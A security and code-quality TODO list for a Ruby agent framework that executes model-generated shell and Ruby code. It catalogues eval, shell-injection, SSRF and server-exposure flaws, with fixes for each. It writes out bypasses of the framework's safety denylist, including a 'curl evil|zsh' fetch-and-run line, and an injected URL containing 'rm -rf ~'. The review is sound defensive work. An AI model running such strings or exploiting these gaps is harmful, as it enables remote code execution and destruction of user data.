# MASTER TODO — Ordered Work Queue (real MASTER, not MASTER2)

## Context
- This targets the **MASTER** gem as it exists on `origin/refactor/comprehensive-quality-improvements`
  (the current, re-architected codebase). The older `MASTER2/` tree is obsolete — ignore it.
- MASTER is materially different from MASTER2: it has `lib/core/`, `lib/agents/`, `lib/actors/`,
  `lib/agent_autonomy.rb`, etc. Most MASTER2 file paths no longer exist. All findings below were
  re-derived by reading the real MASTER (`lib/` ≈ 21.6k Ruby lines, ~80 top-level entries).
- Commit/push to: `claude/pub4-code-review-btGKK`. Never push to main/master without permission.
- Platform: OpenBSD 7.8, Ruby 3.4, zsh. BANNED: bash/awk/sed/tr/python/sudo. Use zsh + `doas`.
- Constitution: no `rescue nil` / swallowed errors (FAIL_VISIBLY), files < 300 lines, Result Ok/Err
  monad, data/lib-config single source of truth, SELF_APPLY (MASTER must pass its own scan).
- Validate: `cd MASTER && bundle exec ruby bin/master scan <path>`.

---

## PRIORITY 0 — Secret hygiene

### 0a. `MASTER/.env` is committed to git
The refactor branch tracks `MASTER/.env` (and `MASTER/.bashrc`). `.env.example` and
`.env.bot.example` already exist, so the real `.env` is both redundant and a standing leak risk.
**Fix**: `git rm --cached MASTER/.env MASTER/.bashrc`, add both to `.gitignore`, rotate any value
that was ever real. (This branch already gitignores them; ensure the refactor branch does too.)

---

## PRIORITY 1 — Execution-layer security (CRITICAL: arbitrary code execution)

The agent execution paths run LLM-produced shell/Ruby/file-writes. Two executors exist; one gates
through a weak denylist, the other gates through nothing.

### 1a. `Safety` is a bypassable denylist, not an allowlist — lib/safety.rb
`command_safe?` blocks only 8 regexes; `ruby_safe?` blocks 9. Trivially bypassed:
- **zsh hole**: the curl-pipe guard is `/curl.*\|\s*(ba)?sh/` — it blocks `sh`/`bash` but NOT
  `zsh`, and `zsh` is MASTER's own `PREFERRED_SHELL` (executor.rb:11). `curl evil|zsh` passes.
- `ruby_safe?` does not list `IO.popen`, `Open3.*`, `%x{}`, `send(:system,…)`, `Kernel.system`,
  `require`, `Process.spawn`, or `File.write` (only `File.delete/unlink`). All execute/write freely.
- `command_safe?` misses `wget`, `nc`, `:|:`, relative `rm -rf somedir`, `>>~/.zshrc`, etc.
**Fix**: replace both denylists with an **allowlist** (explicit permitted commands / a vetted Ruby
surface), or drop in-process execution entirely in favor of a sandboxed subprocess with
pledge/unveil. A denylist cannot secure an LLM-controlled execution surface.

### 1b. `eval()` on LLM Ruby — lib/core/executor.rb:100
`eval(code, TOPLEVEL_BINDING.dup, "(master)", 1)`, gated only by the bypassable `ruby_safe?`.
**SELF_APPLY violation**: `lib/agents/security_agent.rb:13` flags `eval(` as *critical* — MASTER
ships exactly what it tells users to remove. **Fix**: run candidate Ruby in a subprocess
(`Open3.capture3(RbConfig.ruby, "-c", …)` for syntax only; never `eval` it in-process).

### 1c. LLM shell via `IO.popen([zsh,'-c',command])` — lib/core/executor.rb:70
Gated only by `command_safe?` (see 1a). **Fix**: allowlist commands + array-exec specific binaries;
no free-form `zsh -c` on model output.

### 1d. `react_executor` runs LLM input with NO safety gate — lib/core/react_executor.rb:130-165
`execute_tool` dispatches model "actions" directly:
- `file_write` → `File.write(match[1], match[2])` (arbitrary path + content) — line 136
- `shell_command` → `Open3.capture3(cmd)` (raw command) — line 141
- `code_execution`/`execute_code` → `Open3.capture3("ruby", stdin_data: code)` — line 159
- `file_read` → `File.read(path)` (arbitrary path) — line ~133
None pass through `Safety`. **Fix**: first determine if this path is reachable in a live pipeline
(only `evolve.rb:39` references the file by name; the active executor appears to be
`core/executor.rb`). If reachable → gate every branch through the new allowlist + path confinement
(unveil). If dead → delete it (dead RCE surface is still a liability).

### 1e. Shell injection + TLS bypass + SSRF in web fetch — lib/web.rb:135-146
`curl_browse` interpolates the URL straight into a backtick shell:
`` `ftp -o - "#{url}"` `` (138), `` `curl -sL … "#{url}"` `` (140), `` `curl -sLk … "#{url}"` `` (145).
A crafted URL injects shell (`http://x";rm -rf ~;:"`). Line 145 also uses `-k` (disables TLS
verification) and `-sL` follows redirects with no host filtering → SSRF to `169.254.169.254`,
localhost, internal ranges. **Fix**: use `Net::HTTP`/an array-exec curl with a validated `URI`,
scheme allowlist (http/https), host blocklist (loopback, link-local, RFC1918), no `-k`, and
re-validate the host after each redirect.

### 1f. `error_interceptor` runs commands and "fixes" — lib/core/error_interceptor.rb:9,14
`` out = `#{cmd} 2>&1` `` (9) and `fixes&.each { |f| system(f) }` (14) — executes
interpolated/derived command strings. **Fix**: array-exec with validated inputs; never `system()` a
constructed/LLM-influenced string.

### 1g. Server: 0.0.0.0 bind, query-string token, non-constant-time compare — lib/server.rb
- Line 52 grabs a free port on `127.0.0.1`, but line 68 binds the real endpoint to
  `http://0.0.0.0:#{@port}` → exposed on all interfaces. **Fix**: bind `127.0.0.1`.
- Line 106 accepts the token from `QUERY_STRING['token']` → leaks via logs/Referer. **Fix**:
  `Authorization: Bearer` only.
- Line 107 `token == AUTH_TOKEN` is non-constant-time → timing attack. **Fix**:
  `Rack::Utils.secure_compare(token.to_s, AUTH_TOKEN.to_s)`.
- Line 181 `GET /token` returns the token as JSON — ensure it is behind auth (and reconsider
  whether it should exist at all once bound to loopback).

### 1h. TTS/audio: interpolated `system()` + python dependency — lib/edge_tts.rb, lib/tts.rb
`edge_tts.rb` shells out with interpolation (`system("#{python} …")`, `` `#{python} -c …` ``,
`system("powershell … '#{file}'")`) and depends on **python**, which is banned on the OpenBSD
target. `tts.rb:152-159` interpolates the temp path into `system("aucat -i #{temp}")` etc.
**Fix**: array-exec everywhere; drop python (use `piper`/`edge-tts` via a vetted binary or the
OpenBSD-native path); confine to known player binaries.

### 1i. SSRF in harvester — lib/harvester.rb:189-192
`Net::HTTP.new(uri.host, uri.port)` + `Net::HTTP::Get.new(uri)` on a supplied URL with no host
filtering. **Fix**: same scheme allowlist + internal-IP blocklist as 1e.

---

## PRIORITY 2 — Constitution / SELF_APPLY violations

### 2a. 17 files exceed the 300-line limit
replicate.rb (841), evolve.rb (789), creative_chamber.rb (726), plugins/ai_enhancement.rb (551),
violations.rb (543), plugins/business_strategy.rb (454), server.rb (409), boot.rb (404),
memory.rb (398), plugins/web_development.rb (395), swarm.rb (388), agent_autonomy.rb (386),
framework/copilot_optimization.rb (367), framework/universal_standards.rb (347),
framework/quality_gates.rb (331), bug_hunting.rb (330), framework/workflow_engine.rb (312).
**Fix**: split by responsibility, or — if the 300-line rule is genuinely too strict for this gem —
change the rule in one place (smells/quality config) and document why. Do not leave code and
constitution in disagreement.

### 2b. Swallowed errors (FAIL_VISIBLY)
- `rescue nil`: executor.rb:53,64,72,89,101,109; core/context.rb:95.
- bare `rescue`: agent_autonomy.rb:185,195,201; dmesg.rb:112,145 (backtick `rescue`).
- Numerous `rescue => e` in plugins/*, agents/*, stages.rb, harvester.rb — audit each: `e` must be
  logged (dmesg/Logging) before any fallback, or re-raised. Silent audit-log failures
  (`Audit.log(...) rescue nil`) hide tampering — at minimum warn.

### 2c. Banned interpreters/tools in-tree
`edge_tts.rb` uses python; `Executor::SHELL_PATTERN` (executor.rb:9) accepts `bash`/`sh` fenced
blocks though the platform is zsh-only. Constrain to zsh; remove python.

---

## PRIORITY 3 — Architecture smells (sprawl / duplication)

### 3a. Overlapping autonomy/agent subsystems
`lib/agent_autonomy.rb`, `lib/autonomy.rb`, `lib/prompt_autonomy.rb`, `lib/swarm.rb`,
`lib/agents/`, `lib/actors/`, `lib/chamber.rb`, `lib/creative_chamber.rb`, `lib/council.rb` appear
to cover overlapping "multiple agents deliberate" responsibilities. Map who calls what; collapse to
one orchestration model. (DRY / single-source-of-truth.)

### 3b. Singular-vs-plural duplication
`lib/persona.rb` vs `lib/personas/`, `lib/principle.rb` vs `lib/principles/`, `lib/framework/` vs
`lib/config/framework/`, two executors (`core/executor.rb` vs `core/react_executor.rb`). Pick one of
each; delete or merge the other. Two executors with different safety postures is itself a risk (1d).

### 3c. Dead/placeholder tool integrations — react_executor.rb
`web_search`, `browse_page`, `x_keyword_search`, `vision_analyze` return "[simulated …]" strings.
Either implement, or remove from the advertised `TOOLS` list so the agent doesn't believe it has
capabilities it lacks (FAIL_VISIBLY / no false greens).

---

## PRIORITY 4 — Self-modification safety (mostly OK — verify + tighten)
The self-rewriting paths are better than MASTER2's, but verify each before trusting it:
- `auto_fixer.rb:68` validates Ruby (`valid_ruby?`) and keeps `@backups` with `restore_all` — good
  pattern; confirm every write path goes through it.
- `evolve.rb:414-419` runs `system("ruby -c #{file} …")` before keeping changes — good, but the
  `#{file}` interpolation should be array-exec; also it gates on a principle check (verify it can't
  be skipped).
- `stages.rb` `Evolve#call:119` writes content BEFORE any syntax check and relies on a test-suite
  git rollback; `IO.popen(test_cmd, …)` runs `input[:test_command]` as a shell string (injection if
  that input is ever model-influenced). **Fix**: syntax-check before write; array-exec the test cmd.

---

## Definition of done
1. P0: no secrets tracked in git.
2. P1: no LLM-controlled string reaches `eval`/`system`/`sh -c`/backticks/`File.write` without an
   allowlist + sandbox (pledge/unveil); web/harvester fetches are SSRF-safe; server is loopback-only
   with constant-time Bearer auth. MASTER passes its OWN `security_agent` scan.
3. P2: oversized files split (or the rule reconciled in one place); no swallowed errors; no python/bash.
4. P3: one executor, one autonomy model, no simulated tools advertised as real.
5. P4: every self-write is syntax-validated and reversible.
6. `cd MASTER && bundle exec ruby bin/master scan lib` is clean (dogfood / SELF_APPLY).

## Git workflow
- Branch: `claude/pub4-code-review-btGKK`; push `git push -u origin claude/pub4-code-review-btGKK`.
- Commit style: `fix(safety): replace execution denylist with allowlist + unveil sandbox`.
- Never commit `.env` or API keys.
